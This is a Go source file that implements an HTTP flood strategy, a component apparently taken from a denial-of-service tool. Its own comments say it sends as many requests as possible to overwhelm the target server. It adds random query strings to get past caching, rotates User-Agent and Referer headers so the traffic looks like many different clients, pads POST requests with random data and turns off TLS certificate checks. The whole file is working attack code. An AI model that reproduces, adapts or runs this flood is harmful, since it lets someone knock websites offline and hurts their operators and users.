package strategy

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"sync/atomic"
	"time"
)

// HTTPFlood implements high-volume HTTP request flooding.
// It sends as many HTTP requests as possible to overwhelm the target server.
type HTTPFlood struct {
	client            *http.Client
	timeout           time.Duration
	method            string
	postDataSize      int
	requestsPerConn   int
	activeConnections int64
	requestsSent      int64
	localAddr         *net.TCPAddr
	userAgents        []string
	referers          []string
}

var defaultReferers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.youtube.com/",
	"https://www.reddit.com/",
	"https://www.linkedin.com/",
}

func NewHTTPFlood(timeout time.Duration, method string, postDataSize int, requestsPerConn int, bindIP string) *HTTPFlood {
	h := &HTTPFlood{
		timeout:         timeout,
		method:          method,
		postDataSize:    postDataSize,
		requestsPerConn: requestsPerConn,
		localAddr:       newLocalTCPAddr(bindIP),
		userAgents:      defaultUserAgents,
		referers:        defaultReferers,
	}

	transport := &http.Transport{
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   100,
		MaxConnsPerHost:       0,
		IdleConnTimeout:       90 * time.Second,
		DisableKeepAlives:     false,
		ExpectContinueTimeout: 1 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialer := &net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
			LocalAddr: h.localAddr,
		}
		conn, err := dialer.DialContext(ctx, network, addr)
		if err != nil {
			return nil, err
		}

		atomic.AddInt64(&h.activeConnections, 1)

		return &floodTrackedConn{
			Conn: conn,
			onClose: func() {
				atomic.AddInt64(&h.activeConnections, -1)
			},
		}, nil
	}

	h.client = &http.Client{
		Timeout:   timeout,
		Transport: transport,
	}

	return h
}

func (h *HTTPFlood) Execute(ctx context.Context, target Target) error {
	for i := 0; i < h.requestsPerConn; i++ {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		if err := h.sendRequest(ctx, target); err != nil {
			return err
		}
	}
	return nil
}

func (h *HTTPFlood) sendRequest(ctx context.Context, target Target) error {
	reqCtx, cancel := context.WithTimeout(ctx, h.timeout)
	defer cancel()

	var body io.Reader
	if h.method == "POST" && h.postDataSize > 0 {
		postData := h.generatePostData()
		body = bytes.NewReader(postData)
	}

	// Add random query parameter to bypass caching
	targetURL := fmt.Sprintf("%s?r=%d&cb=%d", target.URL, rand.Intn(100000000), rand.Intn(1000000))

	req, err := http.NewRequestWithContext(reqCtx, h.method, targetURL, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	// Set random headers to appear as different clients
	req.Header.Set("User-Agent", h.userAgents[rand.Intn(len(h.userAgents))])
	req.Header.Set("Referer", h.referers[rand.Intn(len(h.referers))])
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", h.randomCacheControl())
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Connection", "keep-alive")

	if h.method == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	// Add custom headers from target
	for k, v := range target.Headers {
		req.Header.Set(k, v)
	}

	resp, err := h.client.Do(req)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	// Discard response body quickly
	io.Copy(io.Discard, resp.Body)

	atomic.AddInt64(&h.requestsSent, 1)

	return nil
}

func (h *HTTPFlood) generatePostData() []byte {
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	data := make([]byte, h.postDataSize)
	for i := range data {
		data[i] = chars[rand.Intn(len(chars))]
	}
	return data
}

func (h *HTTPFlood) randomCacheControl() string {
	options := []string{"no-cache", "max-age=0", "no-store", "must-revalidate"}
	return options[rand.Intn(len(options))]
}

func (h *HTTPFlood) Name() string {
	return "http-flood"
}

func (h *HTTPFlood) ActiveConnections() int64 {
	return atomic.LoadInt64(&h.activeConnections)
}

func (h *HTTPFlood) RequestsSent() int64 {
	return atomic.LoadInt64(&h.requestsSent)
}

type floodTrackedConn struct {
	net.Conn
	onClose func()
	closed  int32
}

func (c *floodTrackedConn) Close() error {
	if atomic.CompareAndSwapInt32(&c.closed, 0, 1) {
		if c.onClose != nil {
			c.onClose()
		}
	}
	return c.Conn.Close()
}
